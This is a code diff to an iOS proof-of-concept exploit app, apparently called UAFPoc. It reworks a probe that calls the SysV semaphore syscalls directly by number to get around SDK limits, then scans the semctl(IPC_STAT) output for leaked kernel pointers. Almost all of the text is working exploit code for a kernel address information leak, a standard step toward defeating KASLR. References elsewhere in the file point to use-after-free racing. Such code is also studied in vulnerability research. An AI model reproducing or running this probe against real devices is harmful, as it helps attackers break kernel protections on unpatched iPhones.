@@ -29,8 +29,6 @@
 #include <sys/sysctl.h>
 #include <dirent.h>
 #include <sys/stat.h>
-#include <sys/ipc.h>
-#include <sys/sem.h>
 
 #if __has_include("UAFPoc-Swift.h")
 #import "UAFPoc-Swift.h"
@@ -826,7 +824,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *semConf = [UIButtonConfiguration filledButtonConfiguration];
     semConf.baseBackgroundColor = [UIColor systemPurpleColor];
     self.sysvSemButton.configuration = semConf;
-    [self.sysvSemButton setTitle:@"SysV Sem Leak Probe (v86)" forState:UIControlStateNormal];
+    [self.sysvSemButton setTitle:@"SysV Sem Leak Probe (v87)" forState:UIControlStateNormal];
     [self.sysvSemButton addTarget:self action:@selector(sysvSemTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sysvSemButton];
 
@@ -8822,60 +8820,58 @@ static void *iohid_threadCopyEvent(void *arg) {
 - (void)sysvSemTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         [self appendLog:@"\n=== SysV Sem Kernel Pointer Leak Probe ==="];
-        [self appendLog:@"Bug: semctl(IPC_STAT) exposes raw sem_base kernel ptr as int32"];
-        [self appendLog:@"Fixed in 26.5 with VM_KERNEL_ADDRHASH obfuscation"];
 
-        // Step 1: Create a semaphore set
-        int semid = semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT);
+        // Use syscall() directly — iOS SDK lacks <sys/sem.h>
+        // SysV sem syscall numbers on arm64 XNU:
+        #define SYSV_SYS_semget  226
+        #define SYSV_SYS_semctl  227
+        #define SYSV_IPC_PRIVATE 0
+        #define SYSV_IPC_CREAT   01000
+        #define SYSV_IPC_STAT    2
+        #define SYSV_IPC_RMID    0
+
+        // Step 1: semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT)
+        int semid = (int)syscall(SYSV_SYS_semget,
+            (long)SYSV_IPC_PRIVATE, (long)1, (long)(0666 | SYSV_IPC_CREAT));
         [self appendLog:[NSString stringWithFormat:
-            @"semget(IPC_PRIVATE, 1, IPC_CREAT): semid=%d errno=%d (%s)",
+            @"semget: semid=%d errno=%d (%s)",
             semid, errno, semid < 0 ? strerror(errno) : "ok"]];
 
         if (semid < 0) {
-            if (errno == ENOSYS) {
-                [self appendLog:@"SysV sem not available — compiled out or sandbox blocked"];
-            } else if (errno == EPERM) {
-                [self appendLog:@"SysV sem blocked by sandbox policy"];
-            }
-            [self appendLog:@"=== Probe failed (syscall blocked) ==="];
+            [self appendLog:[NSString stringWithFormat:
+                @"SysV sem not available (errno=%d)", errno]];
+            [self appendLog:@"=== Probe failed ==="];
             return;
         }
 
-        // Step 2: Allocate buffer and call semctl(IPC_STAT)
-        // semid_ds layout on arm64e:
-        //   sem_perm: 48 bytes (uid/gid/cuid/cgid/mode/_pad/_seq/_key + 2 more)
-        //   sem_base: 4 bytes (int32_t) ← KERNEL POINTER LEAK
-        //   sem_nsems: 2 bytes
-        //   padding
-        //   sem_otime: 8 bytes
-        //   sem_ctime: 8 bytes
-        // Total: ~72-80 bytes
+        // Step 2: semctl(semid, 0, IPC_STAT, buf)
+        // semid_ds struct on arm64e kernel:
+        //   +0: sem_perm (48 bytes: uid,gid,cuid,cgid,mode,_pad,_seq,_key +reserved)
+        //   +48: sem_base (4 bytes, int32_t) ← RAW KERNEL POINTER!!
+        //   +52: sem_nsems (2 bytes)
+        //   +56: padding
+        //   +64: sem_otime (8 bytes)
+        //   +72: sem_ctime (8 bytes)
         uint8_t buf[128];
-        memset(buf, 0xAA, sizeof(buf)); // fill with marker to detect written areas
+        memset(buf, 0xAA, sizeof(buf)); // marker to see what kernel wrote
 
-        union semun {
-            int              val;
-            struct semid_ds *buf;
-            unsigned short  *array;
-        } arg;
-        arg.buf = (struct semid_ds *)buf;
-
-        int rc = semctl(semid, 0, IPC_STAT, arg);
+        long rc = syscall(SYSV_SYS_semctl,
+            (long)semid, (long)0, (long)SYSV_IPC_STAT, (long)buf);
         [self appendLog:[NSString stringWithFormat:
-            @"semctl(%d, 0, IPC_STAT): rc=%d errno=%d (%s)",
-            semid, rc, errno, rc < 0 ? strerror(errno) : "ok"]];
+            @"semctl(IPC_STAT): rc=%ld errno=%d (%s)",
+            rc, errno, rc < 0 ? strerror(errno) : "ok"]];
 
-        // Step 3: Clean up the semaphore
-        semctl(semid, 0, IPC_RMID);
+        // Step 3: Clean up
+        syscall(SYSV_SYS_semctl, (long)semid, (long)0, (long)SYSV_IPC_RMID);
 
         if (rc < 0) {
             [self appendLog:@"=== Probe failed (semctl denied) ==="];
             return;
         }
 
-        // Step 4: Analyze the returned buffer
+        // Step 4: Analyze buffer
         NSMutableString *report = [NSMutableString string];
-        [report appendString:@"\nRaw hex dump of semid_ds (128 bytes):\n  "];
+        [report appendString:@"\nRaw hex (128 bytes):\n  "];
         for (int i = 0; i < 128; i++) {
             [report appendFormat:@"%02x ", buf[i]];
             if ((i + 1) % 16 == 0) [report appendString:@"\n  "];
@@ -8883,46 +8879,34 @@ static void *iohid_threadCopyEvent(void *arg) {
         }
         [report appendString:@"\n\n"];
 
-        // Scan for kernel pointer fragments in every 4-byte aligned position
-        [report appendString:@"32-bit value scan (looking for kernel ptr fragments):\n"];
+        [report appendString:@"32-bit scan:\n"];
         int leakCount = 0;
         for (int off = 0; off < 120; off += 4) {
             uint32_t val = *(uint32_t *)(buf + off);
-            // Skip our 0xAA marker areas
             if (val == 0xAAAAAAAA) continue;
-            // Check for kernel pointer patterns
-            uint32_t high12 = val >> 20;
-            BOOL isKernelHigh = (high12 == 0xfffff || high12 == 0xffffe);
-            BOOL isKernelLow = (val > 0x80000000 && !isKernelHigh && val != 0xFFFFFFFF);
-            if (isKernelHigh || isKernelLow || (val != 0 && val < 0x100000)) {
-                [report appendFormat:@"  +0x%02x: 0x%08x", off, val];
-                if (isKernelHigh) {
-                    [report appendString:@" <-- HIGH32 kernel ptr!"];
-                    leakCount++;
-                } else if (isKernelLow) {
-                    [report appendString:@" <-- LOW32 kernel ptr?"];
-                    leakCount++;
-                } else if (val == 1) {
-                    [report appendString:@" (nsems=1)"];
-                }
-                [report appendString:@"\n"];
+            uint32_t h = val >> 20;
+            if (h == 0xfffff || h == 0xffffe) {
+                [report appendFormat:@"  +0x%02x: 0x%08x <-- HIGH32 kernel ptr!\n", off, val];
+                leakCount++;
+            } else if (val > 0x80000000 && val != 0xFFFFFFFF) {
+                [report appendFormat:@"  +0x%02x: 0x%08x <-- LOW32 kernel ptr?\n", off, val];
+                leakCount++;
+            } else if (val != 0 && val < 0x10000) {
+                [report appendFormat:@"  +0x%02x: 0x%08x (small val)\n", off, val];
             }
         }
 
-        // 64-bit reconstruction: pair adjacent 32-bit values
         [report appendString:@"\n64-bit pair scan:\n"];
         for (int off = 0; off < 120; off += 4) {
             uint64_t pair = *(uint64_t *)(buf + off);
-            if (pair == 0xAAAAAAAAAAAAAAAAULL) continue;
             if ((pair >> 40) == 0xfffffe || (pair >> 40) == 0xffffff) {
                 [report appendFormat:@"  +0x%02x: 0x%016llx <-- KERNEL POINTER!\n", off, pair];
                 leakCount++;
             }
         }
 
-        [report appendFormat:@"\nKernel pointer candidates: %d\n", leakCount];
+        [report appendFormat:@"\nCandidates: %d\n", leakCount];
         [self appendLog:report];
-
         [self appendLog:@"=== SysV Sem Probe complete ==="];
     });
 }
